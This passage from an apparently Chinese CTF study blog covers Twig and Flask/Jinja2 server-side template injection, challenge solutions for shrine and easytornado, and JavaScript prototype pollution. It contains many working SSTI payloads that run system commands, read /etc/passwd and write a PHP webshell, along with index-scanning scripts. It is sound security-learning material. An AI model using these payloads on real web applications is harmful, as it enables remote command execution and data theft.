function最后会变成一个<code>closure</code></p><p>举个例子</p><pre><code>&#123;&#123;["man"]|map((arg)=>"hello #&#123;arg&#125;")&#125;&#125;</code></pre><p>会被编译成（在 Twig 模板引擎中，<code>#&#123;&#125;</code> 用于将变量的值嵌入到字符串中。）</p><pre><code>twig_array_map([0 =&gt; &quot;id&quot;], function ($__arg__) use ($context, $macros) &#123; $context[&quot;arg&quot;] = $__arg__;return (&quot;hello &quot; . ($context[&quot;arg&quot;] ?? null))</code></pre><p>在这里，<code>__arg__</code> 是 <code>twig_array_map</code> 中数组的每个元素，而不是一个回调函数的参数。在匿名函数的闭包内，<code>__arg__</code> 代表了数组中的当前元素。</p><p>可以不传arrow function，可以只传一个字符串。</p><p>所以我们需要找个两个参数的能够命令执行的危险函数即可。通过查阅常见的命令执行函数：</p><ul><li><blockquote><p>system ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] ) : string</p></blockquote></li><li><blockquote><p>passthru ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p></blockquote></li><li><blockquote><p>exec ( string <code>$command</code> [, array <code>&amp;$output</code> [, int <code>&amp;$return_var</code> ]] ) : string</p></blockquote></li><li><blockquote><p>popen ( string <code>$command</code> , string <code>$mode</code> )</p></blockquote></li><li><blockquote><p>shell_exec ( string <code>$cmd</code> ) : string</p></blockquote></li></ul><p>如果以上都被ban了，那么使用<code>&#123;&#123;&#123;"<?php phpinfo();":"/var/www/html/shell.php"&#125;|map("file_put_contents")&#125;&#125;</code> 可以写个shell，实际上它相当于执行:</p><pre><code>file_put_contents（&quot;/var/www/html/shell.php&quot;，&quot;&lt;?php phpinfo();&quot;）</code></pre><p>要注意参数顺序</p><p>其他的暂不研究，上一下目前的payload：</p><pre><code>&#123;&#123;'/etc/passwd'|file_excerpt(1,30)&#125;&#125;&#123;&#123;app.request.files.get(1).__construct('/etc/passwd','')&#125;&#125;&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("whoami")&#125;&#125;&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;&#123;&#123;["id"]|map("system")|join(",")&#123;&#123;&#123;"<?php phpinfo();":"/var/www/html/shell.php"&#125;|map("file_put_contents")&#125;&#125;&#123;&#123;["id",0]|sort("system")|join(",")&#125;&#125;&#123;&#123;["id"]|filter("system")|join(",")&#125;&#125;&#123;&#123;[0,0]|reduce("system","id")|join(",")&#125;&#125;&#123;&#123;['cat /etc/passwd']|filter('system')&#125;&#125;</code></pre><p>php 中的模板还有一些，暂时先放一放，原理应该大同小异，接下来先看看python下的模板注入：</p><h1 id="python-ssti"><a href="#python-ssti" class="headerlink" title="python ssti"></a>python ssti</h1><p>这里还是顺带以flask为入口简单了解一下python web：</p><p><a href="https://blog.csdn.net/weixin_45950544/article/details/104067405">Flask之最易懂的基础教程一（2020年最新-从入门到精通）-CSDN博客</a></p><p>简单使用：</p><pre><code># 导入Flask类库from flask import Flask# 创建应用实例app = Flask(__name__)# 视图函数（路由）@app.route(&#39;/&#39;)def index():    return &#39;&lt;h1&gt;Hello Flask!&lt;h1&gt;&#39;# 启动实施（只在当前模块运行）if __name__ == &#39;__main__&#39;:    app.run()</code></pre><p>这里可以设置app.run(debug&#x3D;True)方便调试</p><p>带参数的视图函数：</p><pre><code># 导入Flask类库from flask import Flask# 创建应用实例app = Flask(__name__)# 视图函数（路由）@app.route(&#39;/user/&lt;username&gt;&#39;)def setname(username):    username=&#39;2333&#39;    return usernamedef say_hello(username):    return &#39;&lt;h1&gt;Hello %s !&lt;h1&gt;&#39; % username# 启动实施（只在当前模块运行）if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>这里一个路由下可以有多个视图函数，但是返回值值能时最后一个视图函数的返回值，因为依次执行视图函数后后面的覆盖前面的</p><p>关于参数：</p><blockquote><p>参数要写在&lt;&gt;中、</p><p>视图函数的参数要与路由中的一致</p><p>也可以指定参数类型（int&#x2F;float&#x2F;path），默认是字符串</p><ul><li><p>**<code>int</code>**：匹配一个整数类型的 URL 变量。</p></li><li><p>**<code>float</code>**：匹配一个浮点数类型的 URL 变量。</p></li><li><p>**<code>path</code>**：匹配一个字符串类型的 URL 变量，但不限制其内容，可以包含斜杠 <code>/</code>。</p><p>@app.route(‘&#x2F;user&#x2F;<a href="path:info">path:info</a>‘)</p></li></ul></blockquote><h5 id="获取request请求值"><a href="#获取request请求值" class="headerlink" title="获取request请求值"></a>获取request请求值</h5><pre><code># 导入Flask类库from flask import Flask,request# 创建应用实例app = Flask(__name__)# request@app.route(&#39;/request/&lt;path:info&gt;&#39;)def request_url(info):    # 完整的请求URL    return request.url    &#39;&#39;&#39;    url：127.0.0.1:5000/request/abc/def?username=xiaoming&amp;pwd=123    网页返回值：http://127.0.0.1:5000/request/abc/def?username=xiaoming&amp;pwd=123    &#39;&#39;&#39;    # 去掉GET参数的URL    return request.base_url    &#39;&#39;&#39;    网页返回值：http://127.0.0.1:5000/request/abc/def    &#39;&#39;&#39;    # 只有主机和端口的URL    return request.host_url    &#39;&#39;&#39;    网页返回值：http://127.0.0.1:5000/    &#39;&#39;&#39;    # 装饰器中写的路由地址    return request.path    &#39;&#39;&#39;    网页返回值：/request/abc/def    &#39;&#39;&#39;    # 请求方法类型    return request.method    &#39;&#39;&#39;    网页返回值：GET （也有可能是POST）    &#39;&#39;&#39;    # 远程地址    return request.remote_addr    &#39;&#39;&#39;    网页返回值：127.0.0.1:5000    &#39;&#39;&#39;    # 获取url参数    return request.args.get(&#39;username&#39;)    return request.args.get(&#39;pwd&#39;)    return str(request.args)    # 获取headers信息    return request.headers.get(&#39;User-Agent&#39;)# 启动实施（只在当前模块运行）if __name__ == &#39;__main__&#39;:    app.run()</code></pre><h5 id="响应的构造（make-response）"><a href="#响应的构造（make-response）" class="headerlink" title="响应的构造（make_response）"></a>响应的构造（make_response）</h5><pre><code>from flask import Flask,make_responseapp = Flask(__name__)@app.route(&#39;/response/&#39;)def response():    # 不指定状态码，默认为200，表示OK    # return ‘OK’    # 构造一个404状态码    # 方法一    return &#39;not fount&#39;,404    # 方法二    # 导入make_response    # 自定义构造一个响应，然后返回200，构造也可以指定状态码404    res = make_response(&#39;我是通过函数构造的响应&#39;,404)    return resif __name__ == &#39;__main__&#39;:    app.run()</code></pre><p>其他一些开发细节暂不深入，先看一下jinja2</p><p>先看一看介绍：</p><p>Flask模板</p><ol><li>模板介绍：<br> 结构清晰、易于维护的代码开发原则是程序员追求的目标之一。目前我们所写的代码都比较简单，但是很明显的可以预见的一个问题是，当项目越来越复杂时，视图函数将变得异常庞大和繁琐，因为视图函数中存放了业务逻辑和表现逻辑。<br> 解决这类问题的通用方法是将不同种类的逻辑分开存放：<br> 业务逻辑：存放在视图函数中，专门处理用户的业务需求；<br> 表现逻辑：存放在单独的模板文件夹中，负责表现效果。</li><li>模板引擎<br> 指定了一套特定的语法来实现表达逻辑，提供了一种专门的替换接口将模板文件换成目标文件（html）。——flask中提供了专门的模板引擎（jinja2）</li></ol><p>看起来模板主要是接管了表现效果的单独文件夹，先看一个简单的例子：</p><pre><code>from flask import Flask,render_template,render_template_string,gfrom flask_script import Managerapp = Flask(__name__)manager = Manager(app)@app.route(&#39;/index&#39;)def index():    # return &#39;模板引擎测试&#39;    # 渲染模板文件    return render_template(&#39;index.html&#39;)@app.route(&#39;/index/&lt;name&gt;&#39;)def welcome(name):    # 变量参数写在渲染函数的后面作为参数，前面的name是形参，后面的name是渲染模板中的解析内容    # return render_template(&#39;index.html&#39;,name=name)    # 第二种方法，使用render_template_string（渲染字符串）    # return render_template_string(&#39;&lt;h2&gt;hello &#123;&#123; name &#125;&#125; ! &lt;h2&gt;&#39;,name=name)    # 第三种方法，使用  g（全局函数）,不需要分配就可以在模板中使用,    # 只需要给定渲染模板即可；    g.name = name    return render_template(&#39;index.html&#39;)if __name__ == &#39;__main__&#39;:    manager.run()</code></pre><blockquote><p>在 Flask 中，默认情况下，<code>render_template(&#39;index.html&#39;)</code> 会在指定的模板文件夹内查找名为 <code>index.html</code> 的模板文件。</p><p>Flask 默认的模板文件夹是项目根目录下的 <code>templates</code> 文件夹。所以，如果你的 <code>index.html</code> 文件位于 <code>templates</code> 文件夹下，那么 <code>render_template(&#39;index.html&#39;)</code> 将会在这个文件夹中查找并渲染 <code>index.html</code> 文件。</p><p>如果你的 <code>index.html</code> 文件不在默认的 <code>templates</code> 文件夹中，而是在其他文件夹，你可以通过指定文件夹路径的方式告诉 Flask 在哪里找到模板文件。你需要在创建 Flask 应用时通过指定 <code>template_folder</code> 参数来设置模板文件夹的路径，如下所示：</p><pre><code>pythonCopy codeapp = Flask(__name__, template_folder=&#39;your_template_folder_path&#39;)</code></pre><p>确保将 <code>&#39;your_template_folder_path&#39;</code> 替换为实际存储模板文件的文件夹路径。这样 Flask 就会在指定的文件夹中查找并渲染模板文件。</p></blockquote><p>然后这里也可以使用函数-类似twig中的filter：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311141654641.png" alt="image-20231114165408388"></p><h3 id="类的知识总结"><a href="#类的知识总结" class="headerlink" title="类的知识总结"></a>类的知识总结</h3><pre><code>__class__            类的一个内置属性，表示实例对象的类。__base__             类型对象的直接基类__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases____mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__             初始化类，返回的类型是function__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;current_app          应用上下文，一个全局变量。request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc\self\fd/3&#39;).read()request.args.x1    get传参request.values.x1  所有参数request.cookies      cookies参数request.headers      请求头参数request.form.x1    post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data   post传参(Content-Type:a/b)request.json post传json  (Content-Type: application/json)config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#39;flask_ssti&#39;&gt;</code></pre><h3 id="常见过滤器"><a href="#常见过滤器" class="headerlink" title="常见过滤器"></a>常见过滤器</h3><p><a href="https://ttl255.com/jinja2-tutorial-part-4-template-filters/#references">Jinja2 Tutorial - Part 4 - Template filters | (ttl255.com)</a></p><pre><code>常用的过滤器int()：将值转换为int类型；float()：将值转换为float类型；lower()：将字符串转换为小写；upper()：将字符串转换为大写；title()：把值中的每个单词的首字母都转成大写；capitalize()：把变量值的首字母转成大写，其余字母转小写；trim()：截取字符串前面和后面的空白字符；wordcount()：计算一个长字符串中单词的个数；reverse()：字符串反转；replace(value,old,new)： 替换将old替换为new的字符串；truncate(value,length=255,killwords=False)：截取length长度的字符串；striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;'<em>hello</em>'|safe&#125;&#125;；list()：将变量列成列表；string()：将变量转换成字符串；join()：将一个序列中的参数值拼接成字符串。示例看上面payload；abs()：返回一个数值的绝对值；first()：返回一个序列的第一个元素；last()：返回一个序列的最后一个元素；format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; "%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;将输出：Helloo? - Foo!length()：返回一个序列或者字典的长度；sum()：返回列表内数值的和；sort()：返回排序后的列表；default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。length()返回字符串的长度，别名是count</code></pre><p>其他的开发类容暂不探究</p><h2 id="jinja-SSTI"><a href="#jinja-SSTI" class="headerlink" title="jinja SSTI"></a>jinja SSTI</h2><p><a href="https://zhuanlan.zhihu.com/p/93746437">CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】 - 知乎 (zhihu.com)</a></p><p>Flask SSTI 题的基本思路就是利用 python 中的 魔术方法 找到自己要用的函数。</p><ul><li>__dict__：保存类实例或对象实例的属性变量键值对字典</li><li>__class__：返回调用的参数类型</li><li>__mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</li><li>__bases__：返回类型列表</li><li>__subclasses__：返回object的子类</li><li>__init__：类的初始化方法</li><li>__globals__：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</li></ul><blockquote><p><strong>base</strong> 和 <strong>mro</strong> 都是用来寻找基类的。</p></blockquote><p>我们可以使用</p><pre><code>for i, subclass in enumerate(str.__class__.__mro__[-1].__subclasses__()):    print(i, subclass)</code></pre><p>来方便查阅我们需要的某个子类的索引：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311141944262.png" alt="image-20231114194457561"></p><p>SSTI 的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。</p><p><a href="https://xz.aliyun.com/t/9584#toc-0">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区 (aliyun.com)</a></p><p><code>__builtins__</code>：以一个集合的形式查看其引用</p><blockquote><h4 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h4><p>当我们启动一个python解释器时，即时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。</p><p>内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。</p><p><code>__builtins__</code> 方法是做为默认初始模块出现的，可用于查看当前所有导入的内建函数。</p></blockquote><p><code>__globals__</code>：该方法会以字典的形式返回当前位置的所有全局变量，与 func_globals 等价。该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。</p><pre><code>__import__()`：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 `__import__()` 来动态载入，就是 `import`。语法：`__import__(模块名)</code></pre><p>这样我们在进行SSTI注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子类、更多的方法，找出可以利用的类和方法加以利用。总之，是通过python的对象的继承来一步步实现文件读取和命令执行的：</p><pre><code>找到父类&lt;type &#39;object&#39;&gt; ---&gt; 寻找子类 ---&gt; 找关于命令执行或者文件操作的模块。</code></pre><h3 id="一些使用到的类或方法："><a href="#一些使用到的类或方法：" class="headerlink" title="一些使用到的类或方法："></a>一些使用到的类或方法：</h3><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>python2——file类：</p><pre><code>&#123;&#123;[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()&#125;&#125;</code></pre><p>Python3——使用file类读取文件的方法仅限于Python 2环境，在Python 3环境中file类已经没有了。我们可以用<code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类去读取文件。首先编写脚本遍历目标Python环境中 <code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类索引号：</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"]&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;FileLoader&#39; in res.text:        print(i)</code></pre><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[79]["get_data"](0, "/etc/passwd")&#125;&#125;</code></pre><h4 id="内建函数-eval-执行命令"><a href="#内建函数-eval-执行命令" class="headerlink" title="内建函数 eval 执行命令"></a>内建函数 eval 执行命令</h4><ul><li>warnings.catch_warnings</li><li>WarningMessage</li><li>codecs.IncrementalEncoder</li><li>codecs.IncrementalDecoder</li><li>codecs.StreamReaderWriter</li><li>os._wrap_close</li><li>reprlib.Repr</li><li>weakref.finalize</li></ul><p>首先编写脚本遍历目标Python环境中含有内建函数 eval 的子类的索引号</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;eval&#39; in res.text:        print(i)</code></pre><pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')&#125;&#125;</code></pre><p>使用eval函数执行命令也是调用的os模块</p><p>Python的 os 模块中有system和popen这两个函数可用来执行命令。其中system()函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；popen()函数执行命令有回显。所以比较常用的函数为popen()函数，而当popen()函数被过滤掉时，可以使用system()函数代替。</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;os.py&#39; in res.text:        print(i)</code></pre><p>随便挑一个类构造payload执行命令即可：</p><pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()&#125;&#125;</code></pre><p>但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。</p><p>我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 <code>os._wrap_close</code>，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;popen&#39; in res.text:        print(i)</code></pre><pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()&#125;&#125;</code></pre><p>还有一些内容，这里就不搬过来了，可以自行查看<a href="https://xz.aliyun.com/t/9584#toc-0">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区 (aliyun.com)</a></p><p>这里还是找几个靶场检验一下</p><h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><p>题目源码：</p><pre><code>import flaskimport osapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)@app.route(&#39;/&#39;)def index():    return open(__file__).read()@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist = [&#39;config&#39;, &#39;self&#39;]        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>现在看这个题就比较清晰了，waf了config和self，但flag放在了config中，如果没有黑名单的时候，我们可以传入 config，或者传入获取，这里还要再去查一下这个config：</p><p><a href="https://zhuanlan.zhihu.com/p/24055329">Flask项目配置（Configuration） - 知乎 (zhihu.com)</a></p><p><a href="https://www.cnblogs.com/andy9468/p/10870574.html">flask的配置项及获取 - 安迪9468 - 博客园 (cnblogs.com)</a></p><p>从第二篇博客中我们发现可以使用current_app：</p><pre><code>&#123;&#123;url_for.__globals__['current_app'].config.FLAG&#125;&#125;&#123;&#123;get_flashed_messages.__globals__['current_app'].config.FLAG&#125;&#125;&#123;&#123;request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']&#125;&#125;</code></pre><h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p>在提示中我们知道需要获取一个cookie-secret的值，我们还需要补充一些知识：</p><p><a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">python SSTI tornado render模板注入 - Hanamizuki花水木 - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型链污染</title>
      <link href="/2023/11/07/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2023/11/07/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E6%A3%80%E6%9F%A5%E5%8E%9F%E5%9E%8B%EF%BC%9A%E6%9B%B4%E6%B7%B1%E5%85%A5%E7%9A%84%E7%A0%94%E7%A9%B6">继承与原型链 - JavaScript | MDN (mozilla.org)</a></p><p><a href="https://drun1baby.top/2022/12/29/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">JavaScript 原型链污染 | Drunkbaby’s Blog (drun1baby.top)</a></p><p>简单来说就是：</p><ul><li><code>prototype</code> 是 <code>newClass</code> 类的一个属性</li><li><code>newClass</code> 类实例化的对象 <code>newObj</code> 不能访问 <code>prototype</code>，但可以通过<code>.__proto__</code> 来访问 <code>newClass</code> 类的 <code>prototype</code></li><li><code>newClass</code> 实例化的对象 <code>newObj</code> 的 <code>.__proto__</code> 指向 <code>newClass</code> 类的 <code>prototype</code></li></ul><h3 id="哪些情况下原型链会被污染"><a href="#哪些情况下原型链会被污染" class="headerlink" title="哪些情况下原型链会被污染"></a>哪些情况下原型链会被污染</h3><p>找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象 merge</li><li>对象 clone（其实内核就是将待操作的对象 merge 到一个空对象中）</li></ul><h1 id="test"><a href="#test" class="headerlink" title="test:"></a>test:</h1><pre><code>function merge(target, source) &#123;    for (let key in source) &#123;        if (key in source &amp;&amp; key in target) &#123;            merge(target[key], source[key])        &#125; else &#123;            target[key] = source[key]        &#125;    &#125;&#125;</code></pre><pre><code>let o1 = &#123;&#125;let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b)</code></pre><p>这里<code>__proto__</code>已经代表o2的原型，并没有被当作key，故无法污染链子</p><pre><code>let o1 = &#123;&#125;let o2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b)</code></pre><p>JSON 解析的情况下，<code>__proto__</code> 会被认为是一个真正的“键名”，而不代表“原型”,此时可以造成污染。</p><h1 id="CatCTF-2022-wife"><a href="#CatCTF-2022-wife" class="headerlink" title="CatCTF 2022 wife"></a>CatCTF 2022 wife</h1><pre><code>app.post(&#39;/register&#39;, (req, res) =&gt; &#123;    let user = JSON.parse(req.body)    if (!user.username || !user.password) &#123;        return res.json(&#123; msg: &#39;empty username or password&#39;, err: true &#125;)    &#125;    if (users.filter(u =&gt; u.username == user.username).length) &#123;        return res.json(&#123; msg: &#39;username already exists&#39;, err: true &#125;)    &#125;    if (user.isAdmin &amp;&amp; user.inviteCode != INVITE_CODE) &#123;        user.isAdmin = false        return res.json(&#123; msg: &#39;invalid invite code&#39;, err: true &#125;)    &#125;    let newUser = Object.assign(&#123;&#125;, baseUser, user) //就是这里，原型链污染    users.push(newUser)    res.json(&#123; msg: &#39;user created successfully&#39;, err: false &#125;)&#125;)</code></pre><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign">Object.assign() - JavaScript | MDN (mozilla.org)</a></p><p><strong><code>Object.assign()</code></strong> 静态方法将一个或者多个<em>源对象</em>中所有<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/propertyIsEnumerable">可枚举</a>的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/hasOwn">自有属性</a>复制到<em>目标对象</em>，并返回修改后的目标对象。</p><p>正常情况下是无法污染的：</p><pre><code>baseUser = &#123;    a:1&#125;user = &#123;    a:2,    b:1,    __proto__:&#123;        c:3    &#125;&#125; // 这个函数的作用：浅复制一个对象，第一个参数位是对象的内容，后面的参数位是多个对象内容叠加进去，进行复制出一个全新的对象let newUser = Object.assign(&#123;&#125;, baseUser, user)  // 无污染，结果正常console.log(newUser)  // &#123;a: 2, b: 1&#125;  // 无污染，结果正常console.log(newUser.__proto__)  // &#123;constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …&#125;</code></pre><p>但是好在后端服务器是JavaScript，我们通过post发送过去的 json是字符串，JavaScript需要通过JSON.parse()函数才能把 json字符串转成对象，如之前所说，json解析时<code>__proto__</code>能被当成真正的key</p><h1 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h1><p>如果遇到过滤的话：</p><p>字符串 stringObject 的 replace() 方法执行的是查找并替换的操作。它将在 stringObject 中查找与 regexp 相匹配的子字符串，然后用 <em>replacement</em> 来替换这些子串。如果 regexp 具有全局标志 g，那么 replace() 方法将替换所有匹配的子串。否则，它只替换第一个匹配子串。</p><p><em>replacement</em> 可以是字符串，也可以是函数。如果它是字符串，那么每个匹配都将由字符串替换。但是 replacement 中的 <code>$</code> 字符具有特定的含义。如下表所示，它说明从模式匹配得到的字符串将用于替换。</p><p><img src="https://drun1baby.top/2022/12/29/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/replace.png" alt="img"></p><pre><code>&#39;123&#39;.replace(&quot;2&quot;,&#39;$`&#39;);&quot;113&quot;&#39;123&#39;.replace(&quot;2&quot;,&quot;$&#39;&quot;);&quot;133&quot;</code></pre><p>这里先把匹配到的字符串替换为$`,然后由于$特殊含义，此时 $`又被替换为原位置的左侧文本，另一个同理</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF_Marks</title>
      <link href="/2023/11/01/CTF-Marks/"/>
      <url>/2023/11/01/CTF-Marks/</url>
      
